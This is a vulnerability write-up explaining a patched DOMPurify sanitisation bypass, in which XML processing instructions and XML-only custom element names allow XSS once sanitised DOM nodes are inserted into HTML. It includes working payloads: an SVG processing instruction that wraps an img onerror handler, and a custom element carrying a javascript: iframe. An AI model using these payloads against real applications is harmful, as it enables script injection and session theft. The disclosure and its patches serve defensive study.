# DOMPurify - Untrusted Node Bypass (Processing Instruction & Custom Element Confusion)

> **Research by:** Slonser  
> **Published:** March 19, 2024  
> **Category:** XSS / DOMPurify Bypass / XML Parsing Confusion  
> **Severity:** High (Context Dependent)

---

# Overview

This write-up explains a security issue discovered in **DOMPurify** when sanitizing **DOM Nodes** instead of HTML strings.

The vulnerability allows an attacker to bypass sanitization under specific conditions by exploiting differences between **XML** and **HTML** parsing.

The issue affected applications that:

- Accept untrusted DOM Nodes
- Sanitize them using DOMPurify
- Later insert them into an HTML document

This bypass was responsibly disclosed and quickly patched by the DOMPurify maintainers.

---

# Background

Most developers use DOMPurify like this:

```javascript
DOMPurify.sanitize("<a href='https://example.com'>Example</a>");
```

Output:

```html
<a href="https://example.com">Example</a>
```

However, DOMPurify also supports sanitizing **DOM Nodes** directly.

Example:

```javascript
let link = document.createElement("a");
link.href = "https://example.com";

DOMPurify.sanitize(link);
```

This lesser-known feature became the basis of the vulnerability.

---

# Vulnerable Scenario

Consider the following simplified application:

```javascript
function pastUserFrame(user_link){
    let frame = document.createElement('iframe');
    frame.sandbox='allow-same-origin';
    frame.id='frame';
    frame.src=user_link;

    document.body.appendChild(frame);
}

function validateOnClick(){

    let box = document.createElement('div');

    let button = frame.contentDocument.documentElement;

    box.appendChild(button);

    user_container.innerHTML = DOMPurify.sanitize(box);

}
```

In this scenario:

- Users upload SVG/XML files.
- The uploaded document is loaded inside an iframe.
- DOMPurify sanitizes the imported DOM Node.
- The sanitized content is inserted into the HTML page.

Although the uploaded file is protected by a restrictive CSP, moving its DOM into another page with a weaker CSP creates a new attack surface.

---

# Root Cause

The vulnerability exists because **XML Nodes** and **HTML Nodes** behave differently.

DOMPurify expected HTML-like parsing but received XML objects.

This mismatch introduced unexpected parsing behavior.

The main differences include:

- XML supports **Processing Instructions**
- HTML does **not**
- XML and HTML use different parsing rules
- XML accepts element names that HTML rejects

---

# Processing Instructions

XML supports special nodes called **Processing Instructions**.

Syntax:

```xml
<?target instructions?>
```

Example:

```xml
<?xml-stylesheet href="style.xsl"?>
```

DOMPurify did **not** inspect these nodes during sanitization.

---

# Why DOMPurify Missed Them

Internally DOMPurify traversed nodes using:

```javascript
NodeFilter.SHOW_ELEMENT
| NodeFilter.SHOW_COMMENT
| NodeFilter.SHOW_TEXT
```

Missing filter:

```javascript
NodeFilter.SHOW_PROCESSING_INSTRUCTION
```

Because Processing Instructions were never visited, they survived sanitization.

---

# XML to HTML Confusion

An uploaded SVG could contain:

```xml
<?xml-stylesheet ?>
```

When inserted into an HTML document:

- XML parser ends Processing Instruction using

```xml
?>
```

- HTML parser continues until

```html
>
```

This difference allows HTML content to escape the intended XML context.

---

# Example Payload

```xml
<!DOCTYPE svg>

<svg xmlns="http://www.w3.org/2000/svg">

<?xml-stylesheet >

<img src=x onerror="alert('DOMPurify bypassed!')">

?>

</svg>
```

When imported into HTML:

- Processing Instruction becomes an HTML comment
- Browser parsing differs
- The `<img>` element becomes executable
- XSS is triggered

---

# Vulnerability Flow

```
User Uploads XML
        │
        ▼
XML Parsed
        │
        ▼
DOM Node Imported
        │
        ▼
DOMPurify Sanitizes
        │
        ▼
Processing Instruction Survives
        │
        ▼
Inserted into HTML
        │
        ▼
Parser Confusion
        │
        ▼
Cross-Site Scripting (XSS)
```

---

# First Patch

The maintainers updated the NodeIterator.

Before:

```javascript
NodeFilter.SHOW_ELEMENT
| NodeFilter.SHOW_COMMENT
| NodeFilter.SHOW_TEXT
```

After:

```javascript
NodeFilter.SHOW_ELEMENT
| NodeFilter.SHOW_COMMENT
| NodeFilter.SHOW_TEXT
| NodeFilter.SHOW_PROCESSING_INSTRUCTION
```

This ensured Processing Instructions were removed during sanitization.

---

# Custom Element Bypass

Although the initial patch fixed the default configuration, another bypass existed.

Example configuration:

```javascript
DOMPurify.sanitize(node, {

CUSTOM_ELEMENT_HANDLING:{

tagNameCheck:/-foo-bar$/,

allowCustomizedBuiltInElements:true

}

});
```

This configuration allows custom elements ending in:

```
-foo-bar
```

Example malicious XML:

```xml
<_slonser-foo-bar
data-slonser="&lt;iframe/src=javascript:alert()&gt;">
</_slonser-foo-bar>
```

This tag:

- Is valid XML
- Is **not** valid HTML
- Creates another HTML/XML parsing mismatch

Result:

Another XSS bypass.

---

# Second Patch

DOMPurify introduced stricter validation for custom element names.

Regular expression:

```javascript
/^[a-z][a-z\d]*(-[a-z\d]+)+$/i
```

Only HTML-compliant custom element names are now accepted.

---

# Impact

Depending on the application, an attacker could:

- Bypass DOMPurify sanitization
- Execute arbitrary JavaScript
- Achieve Cross-Site Scripting (XSS)
- Steal user sessions
- Perform actions on behalf of victims
- Inject malicious HTML into trusted pages

The vulnerability only affected applications that sanitized **DOM Nodes** originating from XML documents.

---

# Root Cause Summary

The vulnerability resulted from:

- XML vs HTML parsing differences
- Unhandled Processing Instructions
- Incomplete DOM traversal
- Custom element validation issues
- Context confusion between XML and HTML

---

# Lessons Learned

- Never assume XML and HTML behave identically.
- Sanitize every node type.
- Validate custom element names carefully.
- Parser confusion can introduce unexpected security issues.
- Less commonly used APIs deserve the same security scrutiny as common ones.

---

# Timeline

| Date | Event |
|------|-------|
| March 2024 | Vulnerability discovered |
| Same Day | Reported to DOMPurify maintainers |
| Same Day | Processing Instruction patch released |
| Next Day | Custom Element validation patch released |

---

# References

- Original Research (Slonser)
- DOMPurify GitHub Repository
- XML Processing Instructions Specification
- HTML Parsing Specification
- OWASP Cross-Site Scripting Prevention Cheat Sheet

---

# Disclaimer

This repository is created for **educational and defensive security purposes only**.

The techniques discussed here should only be used during:

- Authorized penetration testing
- Security research
- Bug bounty programs
- Responsible vulnerability disclosure

Unauthorized exploitation of systems is illegal.
